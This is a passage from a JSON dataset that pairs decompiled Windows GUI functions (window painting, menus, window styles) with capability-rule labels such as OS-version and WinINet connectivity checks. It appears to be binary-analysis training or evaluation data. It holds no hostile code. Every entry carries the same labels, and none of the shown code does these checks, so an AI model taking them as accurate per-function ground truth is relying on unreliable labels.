in_EAX[0x9a] || (iVar2 != *(*0x49ac20 + 100))) && (piVar3 != NULL)\n                 ) && ((piVar3 == in_EAX || (piVar3 != *(*0x49ac20 + 0x68))))))) {\n                if ((piVar3[0x9a] != 0) && (iVar2 != piVar3[0x9a])) {\n                    fcn.00451ae8(0);\n                }\n                (**(*piVar3 + 0xf8))();\n            }\n            goto code_r0x0043eb0c;\n        }\n    }\n    if (iVar6 == *0x49ac28) {\n        fcn.00451ae8(0);\n        fcn.00451ae8(0);\n        fcn.00451ae8(0);\n        fcn.00451ae8(0);\n        fcn.00451ae8(0);\n        fcn.00451ae8(0);\n    }\ncode_r0x0043eb0c:\n    fcn.00455690();\n    return;\n}\n",
        "token_count": 1766
    },
    "0043ebb4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ebb4(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffff6c;\n    int32_t iStack140;\n    uint *puStack136;\n    uchar *puStack132;\n    uint *puStack128;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_5ch;\n    uint var_58h;\n    uint var_4ch;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    iVar2 = *param_2;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (iVar2 != 0xf) {\n        if (iVar2 == 0x14) {\n            fcn.00424f98();\n            puStack128 = 0x43ec22;\n            (**(*var_4h + 0x44))();\n            puStack128 = &fcn.0043ebb4::var_6ch;\n            puStack132 = var_8h[1];\n            puStack136 = 0x43ec32;\n            sub.user32.dll_FillRect();\n            if ((*(var_4h + 0x277) == '\\x02') && (var_4h[0xa7] != 0)) {\n                puStack136 = &fcn.0043ebb4::var_5ch;\n                iStack140 = var_4h[0xa7];\n                sub.user32.dll_GetClientRect();\n                uVar1 = fcn.00424f98();\n                sub.user32.dll_FillRect(var_8h[1], &fcn.0043ebb4::var_5ch, uVar1);\n            }\n            var_8h[3] = 1;\n        }\n        else if (iVar2 == 0x3f) {\n            puStack128 = 0x43ec91;\n            fcn.0043eb28(&stack0xfffffffc);\n            if (*(var_4h + 0x277) == '\\x02') {\n                iVar2 = fcn.0043f4c4();\n                if (iVar2 != 0) {\n                    puStack128 = 0x43ecb4;\n                    fcn.0043eb74(&stack0xfffffffc);\n                }\n                fcn.0043b728();\n            }\n        }\n        else if (iVar2 == 0x84) {\n            puStack128 = 0x43ebeb;\n            fcn.0043eb28(&stack0xfffffffc);\n            if (var_8h[3] == 1) {\n                var_8h[3] = -1;\n            }\n        }\n        else {\n            puStack128 = 0x43ed8f;\n            fcn.0043eb28(&stack0xfffffffc);\n        }\n        return;\n    }\n    var_ch = param_2[1];\n    if (var_ch == 0) {\n        puStack128 = in_EAX[0xa7];\n        puStack132 = 0x43ecf4;\n        iVar2 = sub.user32.dll_BeginPaint();\n        var_8h[1] = iVar2;\n    }\n    puStack136 = 0x43ed82;\n    iStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    puStack132 = &stack0xfffffffc;\n    if (var_ch == 0) {\n        in_stack_ffffff6c = var_4h[0xa7];\n        puStack132 = &stack0xfffffffc;\n        sub.user32.dll_GetWindowRect(in_stack_ffffff6c, &fcn.0043ebb4::var_5ch);\n        fcn.00450370();\n        fcn.0044ee3c();\n    }\n    fcn.00455cec();\n    *in_FS_OFFSET = in_stack_ffffff6c;\n    iStack140 = 0x43ed90;\n    if (var_ch == 0) {\n        sub.user32.dll_EndPaint(var_4h[0xa7], &fcn.0043ebb4::var_4ch);\n    }\n    return;\n}\n",
        "token_count": 952
    },
    "0043ee98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043ee98(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (*(in_EAX + 0xa3) == '\\0') {\n        *(in_EAX + 0xa3) = 1;\n        uStack20 = 0x43ef18;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack24;\n        if (*(in_EAX + 0x18) != '\\0') {\n            if (in_EAX[0xc] == 0) {\n                puStack16 = &stack0xfffffffc;\n                (**(*in_EAX + 0x74))();\n            }\n            else {\n                (**(*in_EAX + 0x74))();\n            }\n            (**(*in_EAX + 0x70))();\n        }\n        *in_FS_OFFSET = uStack24;\n        *(in_EAX + 0xa3) = 0;\n        return;\n    }\n    return;\n}\n",
        "token_count": 256
    },
    "0043f140": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __cdecl fcn.0043f140(uint32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint32_t *in_ECX;\n    uint32_t *in_EDX;\n    \n    *in_EDX = *in_EDX & 0x7f3bff7f;\n    *in_ECX = *in_ECX & 0xfffffe7e;\n    *arg_8h = *arg_8h & 0xffffd7ff;\n    cVar1 = *(in_EAX + 0x271);\n    if ((*(in_EAX + 0x277) == '\\x01') && ((cVar1 == '\\0' || (cVar1 == '\\x03')))) {\n        cVar1 = '\\x02';\n    }\n    // switch table (6 cases) at 0x43f18e\n    switch(cVar1) {\n    case '\\0':\n        if ((*(in_EAX + 0x30) == 0) && (*(in_EAX + 0x1c4) == 0)) {\n            *in_EDX = *in_EDX | 0x80000000;\n        }\n        break;\n    case '\\x01':\n    case '\\x04':\n        *in_EDX = *in_EDX | 0xc00000;\n        break;\n    case '\\x02':\n    case '\\x05':\n        *in_EDX = *in_EDX | 0xc40000;\n        break;\n    case '\\x03':\n        if (((*(in_EAX + 0x1c) & 0x10) == 0) || (*(in_EAX + 0x30) == 0)) {\n            *in_EDX = *in_EDX | 0x80c00000;\n        }\n        else {\n            *in_EDX = *in_EDX | 0xc00000;\n        }\n        *in_ECX = *in_ECX | 0x101;\n        if (**0x495a14 == '\\0') {\n            *in_EDX = *in_EDX | 0x400080;\n        }\n        *arg_8h = *arg_8h | 0x2808;\n    }\n    if ((cVar1 - 4U < 2) && (*(in_EAX + 0x277) != '\\x01')) {\n        *in_ECX = *in_ECX | 0x80;\n    }\n    return cVar1 + -6;\n}\n",
        "token_count": 546
    },
    "0043f254": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f254(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    if (param_2 != *(in_EAX + 0x271)) {\n        *(in_EAX + 0x271) = param_2;\n        uStack24 = 0x43f292;\n        fcn.0043cbdc();\n        uStack24 = 0x43f299;\n        cVar1 = fcn.004588a0();\n        if ((cVar1 != '\\0') && (((*(in_EAX + 7) & 0x10) == 0 || (((*(in_EAX + 7) & 0x10) != 0 && (in_EAX[0xc] != 0))))))\n        {\n            uStack24 = 0xfffffff0;\n            uStack28 = 0x43f2c4;\n            uStack28 = fcn.00458594();\n            uStack32 = 0x43f2ca;\n            uStack28 = sub.user32.dll_GetWindowLongA();\n            uStack32 = 0xffffffec;\n            uStack36 = 0x43f2d6;\n            uStack36 = fcn.00458594();\n            uStack32 = sub.user32.dll_GetWindowLongA();\n            uVar2 = fcn.00458594(0xffffffe6);\n            uStack36 = sub.user32.dll_GetClassLongA(uVar2);\n            puVar4 = &stack0xffffffdc;\n            fcn.0040484c(puVar4);\n            fcn.0040484c();\n            uVar3 = 0xfffffff0;\n            uVar2 = fcn.00458594(0xfffffff0, puVar4);\n            sub.user32.dll_SetWindowLongA(uVar2);\n            uVar2 = fcn.00458594(0xffffffec, uVar3);\n            sub.user32.dll_SetWindowLongA(uVar2);\n            uVar2 = fcn.00458594(0xffffffe6, uVar3);\n            sub.user32.dll_SetClassLongA(uVar2);\n            cVar1 = fcn.004588a0();\n            if (cVar1 != '\\0') {\n                if (**0x495a14 != '\\0') {\n                    if (*(in_EAX + 0x271) == '\\x03') {\n                        uVar2 = fcn.00458594(0x80, 1, 0);\n                        sub.user32.dll_SendMessageA(uVar2);\n                    }\n                    else {\n                        uVar2 = fcn.004410e0();\n                        uVar2 = fcn.00458594(0x80, 1, uVar2);\n                        sub.user32.dll_SendMessageA(uVar2);\n                    }\n                }\n                uVar2 = fcn.00458594(0xffffffff);\n                sub.user32.dll_GetSystemMenu(uVar2);\n                fcn.00451ae8(0);\n            }\n            uVar2 = fcn.00458594(0, 0, 0, 0, 0, 0x37);\n            sub.user32.dll_SetWindowPos(uVar2);\n            (**(*in_EAX + 0x80))();\n        }\n    }\n    return;\n}\n",
        "token_count": 768
    },
    "0043f490": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043f490(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) {\n        sub.user32.dll_SendMessageA(*(in_EAX + 0x29c), 0x229, 0, 0);\n        uVar1 = fcn.0044d290();\n    }\n    return uVar1;\n}\n",
        "token_count": 122
    },
    "0043f4c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043f4c4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) && (iVar1 = fcn.00443da0(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.00443d8c();\n            if (*(iVar2 + 0x277) == '\\x01') {\n                iVar3 = iVar3 + 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return iVar3;\n}\n",
        "token_count": 184
    },
    "0043f510": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043f510(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) && (iVar1 = fcn.00443da0(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.00443d8c();\n            if ((*(iVar2 + 0x277) == '\\x01') && (param_2 = param_2 + -1,  param_2 < 0)) {\n                return iVar2;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 197
    },
    "0043f674": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f674(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (param_2 != *(in_EAX + 0x277)) {\n        if (((param_2 != '\\0') || (*(in_EAX + 0x277) != '\\x03')) && ((param_2 != '\\x03' || (*(in_EAX + 0x277) != '\\0')))\n           ) {\n            if ((param_2 == '\\x01') && (*(in_EAX + 0x9e) == '\\0')) {\n                puStack20 = 0x43f729;\n                fcn.0043fb7c();\n            }\n            bVar3 = (*(in_EAX + 7) & 0x10) == 0;\n            if (bVar3) {\n                puStack20 = 0x43f748;\n                fcn.00459934();\n            }\n            uStack24 = 0x43f7dc;\n            uStack28 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe4;\n            puStack20 = &stack0xfffffffc;\n            if (bVar3) {\n                puStack20 = &stack0xfffffffc;\n                (**(*in_EAX + 0xb0))();\n            }\n            cVar1 = *(in_EAX + 0x277);\n            *(in_EAX + 0x277) = param_2;\n            if (((param_2 == '\\x02') || (cVar1 == '\\x02')) && (*(in_EAX + 0x1d9) == '\\0')) {\n                fcn.0043fcb4();\n                fcn.004509a4();\n            }\n            if (bVar3) {\n                fcn.00455154();\n            }\n            if (param_2 == '\\x01') {\n                fcn.0043e3a8();\n            }\n            *in_FS_OFFSET = uStack28;\n            puStack20 = 0x43f7e3;\n            if (bVar3) {\n                uStack24 = 0x43f7db;\n                fcn.00459934();\n            }\n            return;\n        }\n        *(in_EAX + 0x277) = param_2;\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            puStack20 = 0x43f6ce;\n            cVar1 = fcn.004588a0();\n            if (cVar1 != '\\0') {\n                puStack20 = 0x213;\n                uStack24 = 0;\n                uStack28 = 0;\n                uVar2 = fcn.00458594(*((*(in_EAX + 0x277) == '\\x03') * 4 + 0x49356c), 0, 0);\n                sub.user32.dll_SetWindowPos(uVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 703
    },
    "0043f7e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043f7e8(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    if ((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) {\n        iVar3 = 0;\n        if (*(in_EAX + 0x290) != NULL) {\n            iVar3 = (**(**(in_EAX + 0x290) + 0x34))();\n        }\n        uVar4 = 0;\n        if (*(in_EAX + 0x2a0) != 0) {\n            uVar4 = fcn.004349f0();\n        }\n        uVar1 = fcn.00458594();\n        iVar2 = sub.user32.dll_GetMenu(uVar1);\n        sub.user32.dll_SendMessageA(*(in_EAX + 0x29c), 0x230, iVar3, uVar4);\n        if (iVar3 != iVar2) {\n            uVar4 = fcn.00458594();\n            sub.user32.dll_DrawMenuBar(uVar4);\n        }\n    }\n    return;\n}\n",
        "token_count": 272
    },
    "0043f8b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043f8b0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint *arg_ch;\n    uint arg_8h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    if ((param_2 != 0) && (iVar2 = fcn.00443da0(),  -1 < iVar2 + -1)) {\n        do {\n            var_4h = iVar2;\n            iVar2 = fcn.00443d8c();\n            if ((param_2 == *(iVar2 + 0x290)) && (iVar2 = fcn.00443d8c(),  in_EAX != iVar2)) {\n                var_ch = *(param_2 + 8);\n                var_8h._0_1_ = 0xb;\n                arg_ch = &var_ch;\n                arg_8h = 0;\n                fcn.00407550();\n                fcn.0040db40(arg_8h, arg_ch);\n                fcn.00404ec4();\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != 0);\n    }\n    if (*(in_EAX + 0x290) != 0) {\n        fcn.00438264();\n    }\n    if (((*(in_EAX + 0x1c) & 8) != 0) || ((param_2 != 0 && ((*(param_2 + 0x1c) & 8) != 0)))) {\n        param_2 = 0;\n    }\n    *(in_EAX + 0x290) = param_2;\n    if ((param_2 == 0) || ((fcn.00420044(),  (*(in_EAX + 0x1c) & 0x10) == 0 && (*(in_EAX + 0x271) == '\\x03')))) {\n        cVar1 = fcn.004588a0();\n        if (cVar1 != '\\0') {\n            uVar4 = fcn.00458594(0);\n            sub.user32.dll_SetMenu(uVar4);\n        }\n    }\n    else if (((*(*(in_EAX + 0x290) + 0x5c) == '\\0') && (*(in_EAX + 0x277) != '\\x01')) ||\n            ((*(in_EAX + 0x1c) & 0x10) != 0)) {\n        cVar1 = fcn.004588a0();\n        if (cVar1 != '\\0') {\n            iVar2 = (**(**(in_EAX + 0x290) + 0x34))();\n            arg_8h = fcn.00458594();\n            iVar3 = sub.user32.dll_GetMenu();\n            if (iVar2 != iVar3) {\n                (**(**(in_EAX + 0x290) + 0x34))();\n                arg_8h = fcn.00458594();\n                sub.user32.dll_SetMenu();\n            }\n            fcn.00458594();\n            fcn.00438264();\n        }\n    }\n    else if ((*(in_EAX + 0x277) != '\\x01') && (cVar1 = fcn.004588a0(),  cVar1 != '\\0')) {\n        uVar4 = fcn.00458594(0);\n        sub.user32.dll_SetMenu(uVar4);\n    }\n    if (*(in_EAX + 0x276) != '\\0') {\n        fcn.00440f6c();\n    }\n    fcn.0043f7e8();\n    if (((*(in_EAX + 0x298) != 0) && ((*(in_EAX + 0x1c) & 0x10) != 0)) && (*(in_EAX + 0x30) != 0)) {\n        uVar4 = fcn.00458594(0, 0, 0, 0, 0, 0x37);\n        sub.user32.dll_SetWindowPos(uVar4);\n        fcn.00451ae8(0);\n        fcn.00451ae8(0);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1038
    },
    "0043faec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043faec(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x32c) == 0) {\n        uVar1 = fcn.00404620();\n        *(in_EAX + 0x32c) = uVar1;\n    }\n    return *(in_EAX + 0x32c);\n}\n",
        "token_count": 90
    },
    "0043fb14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043fb14(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x338) == 0) {\n        uVar1 = fcn.00404620();\n        *(in_EAX + 0x338) = uVar1;\n    }\n    return *(in_EAX + 0x338);\n}\n",
        "token_count": 87
    },
    "0043fc4c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0043fc4c(void)\n\n{\n    int32_t in_EAX;\n    \n    return *(in_EAX + 0x2a4) & 0xffffff00 | **(in_EAX + 0x2a4) != 0;\n}\n",
        "token_count": 62
    },
    "0043fd50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043fd50(uint param_1, uint8_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (((param_2 != *(in_EAX + 0x273)) && (*(in_EAX + 0x273) = param_2,  (*(in_EAX + 0x1c) & 0x10) == 0)) &&\n       (*(in_EAX + 0x1da) != '\\0')) {\n        uVar1 = fcn.00458594(*(param_2 * 4 + 0x493574));\n        sub.user32.dll_ShowWindow(uVar1);\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "0043fd90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043fd90(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iStack20;\n    \n    if ((*(in_EAX + 0x279) != '\\0') && (*(*0x49ac1c + 0x44) != 0)) {\n        iVar10 = 0;\n        if (*(in_EAX + 0x279) == '\\x02') {\n            iVar10 = fcn.0043f590();\n            iVar10 = *(iVar10 + 4);\n        }\n        else if ((*(in_EAX + 0x279) == '\\x03') && (*(*0x49ac20 + 0x68) != 0)) {\n            iVar10 = fcn.0043f590();\n            iVar10 = *(iVar10 + 4);\n        }\n        else if (*(in_EAX + 0x279) == '\\x01') {\n            iVar10 = fcn.00444c6c();\n            iVar10 = *(iVar10 + 4);\n        }\n        iVar1 = fcn.0043f590();\n        iVar1 = *(iVar1 + 4);\n        iStack20 = fcn.00443d70();\n        if (-1 < iStack20 + -1) {\n            do {\n                iVar2 = fcn.00443d5c();\n                if (((*(iVar2 + 4) == iVar10) && (iVar10 != iVar1)) && (iVar2 = fcn.00443d70(),  -1 < iVar2 + -1)) {\n                    iVar11 = 0;\n                    do {\n                        iVar3 = fcn.00443d5c(iVar10, iVar1, iVar11);\n                        if (*(iVar3 + 4) == iVar1) {\n                            if (*(in_EAX + 0x9e) == '\\x04') {\n                                iVar3 = in_EAX[0x13];\n                                fcn.00443d5c(iVar3, in_EAX[0x12]);\n                                iVar4 = fcn.00443a3c();\n                                fcn.00443d5c(iVar4);\n                                iVar5 = fcn.00443a20();\n                                uVar6 = iVar5 - iVar3;\n                                iVar3 = uVar6 >> 1;\n                                if (iVar3 < 0) {\n                                    iVar3 = iVar3 + ((uVar6 & 1) != 0);\n                                }\n                                fcn.00443d5c(iVar4 + iVar3);\n                                fcn.00443a08();\n                                fcn.00443d5c();\n                                fcn.00443a54();\n                                (**(*in_EAX + 0x88))();\n                            }\n                            else if (*(in_EAX + 0x9e) == '\\x06') {\n                                iVar3 = in_EAX[0x13];\n                                fcn.00443d5c(iVar3, in_EAX[0x12]);\n                                iVar4 = fcn.00443a3c();\n                                fcn.00443d5c(iVar4);\n                                iVar5 = fcn.00443a20();\n                                uVar6 = iVar5 - iVar3;\n                                iVar3 = uVar6 >> 1;\n                                if (iVar3 < 0) {\n                                    iVar3 = iVar3 + ((uVar6 & 1) != 0);\n                                }\n                                fcn.00443d5c(iVar4 + iVar3);\n                                fcn.00443a08();\n                                fcn.00443d5c();\n                                fcn.00443a54();\n                                (**(*in_EAX + 0x88))();\n                            }\n                            else {\n                                fcn.00443d5c(iVar10, iVar1, iVar11);\n                                iVar3 = fcn.00443a08();\n                                iVar4 = fcn.0043df38();\n                                fcn.00443d5c();\n                                iVar5 = fcn.00443a08();\n                                fcn.00443d5c();\n                                iVar7 = fcn.00443a08();\n                                fcn.00443d5c();\n                                iVar8 = fcn.00443a54();\n                                if (iVar7 + iVar8 < in_EAX[0x12] + ((iVar3 + iVar4) - iVar5)) {\n                                    fcn.00443d5c();\n                                    fcn.00443a08();\n                                    fcn.00443d5c();\n                                    fcn.00443a54();\n                                }\n                                fcn.00443d5c();\n                                iVar3 = fcn.00443a3c();\n                                iVar4 = fcn.0043df58();\n                                iVar3 = iVar3 + iVar4;\n                                fcn.00443d5c();\n                                iVar4 = fcn.00443a3c();\n                                fcn.00443d5c();\n                                iVar5 = fcn.00443a3c();\n                                fcn.00443d5c();\n                                iVar7 = fcn.00443a20();\n                                if (iVar5 + iVar7 < (iVar3 - iVar4) + in_EAX[0x13]) {\n                                    fcn.00443d5c();\n                                    uVar9 = fcn.00443a3c();\n                                    fcn.00443d5c(uVar9);\n                                    fcn.00443a20();\n                                }\n                                (**(*in_EAX + 0x88))(in_EAX[0x13], in_EAX[0x12]);\n                            }\n                        }\n                        iVar11 = iVar11 + 1;\n                        iVar2 = iVar2 + -1;\n                    } while (iVar2 != 0);\n                }\n                iStack20 = iStack20 + -1;\n            } while (iStack20 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 1328
    },
    "00440744": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00440744(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *extraout_EDX;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff20;\n    uint uStack208;\n    uint uStack204;\n    uchar *puStack200;\n    uint var_b4h;\n    uint var_b0h;\n    uint32_t var_a8h;\n    uint *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack200 = &stack0xfffffffc;\n    uStack204 = 0x44086d;\n    uStack208 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack208;\n    if ((*(in_EAX + 0x277) == '\\x01') && ((*(in_EAX + 0x1c) & 0x10) == 0)) {\n        if ((*(*0x49ac1c + 0x44) == 0) || (puStack200 = &stack0xfffffffc,  *(*(*0x49ac1c + 0x44) + 0x29c) == 0)) {\n            puStack200 = &stack0xfffffffc;\n            fcn.00407550();\n            fcn.0040db04();\n            fcn.00404ec4();\n            param_2 = extraout_EDX;\n        }\n        var_24h = param_2 + 0x13;\n        var_20h = *param_2;\n        var_1ch = *0x4987f8;\n        var_18h = param_2[3];\n        var_14h = param_2[4];\n        var_10h = param_2[5];\n        var_ch = param_2[6];\n        var_8h = param_2[1];\n        var_4h = param_2[8];\n        in_stack_ffffff20 = *(*(*0x49ac1c + 0x44) + 0x29c);\n        uVar1 = sub.user32.dll_SendMessageA(in_stack_ffffff20, 0x220, 0, &var_24h);\n        *(in_EAX + 0x1b4) = uVar1;\n        *(in_EAX + 0x358) = *(in_EAX + 0x358) | 0x10;\n    }\n    else {\n        puVar3 = &var_b0h;\n        for (iVar2 = 0x23; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = *param_2;\n            param_2 = param_2 + 1;\n            puVar3 = puVar3 + 1;\n        }\n        var_a8h = var_a8h & 0xfff7ffff;\n        fcn.00454aa0();\n        *(in_EAX + 0x358) = *(in_EAX + 0x358) & 0xef;\n    }\n    fcn.004433cc();\n    *in_FS_OFFSET = in_stack_ffffff20;\n    fcn.00405530(0x440874);\n    return;\n}\n",
        "token_count": 760
    },
    "004408c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
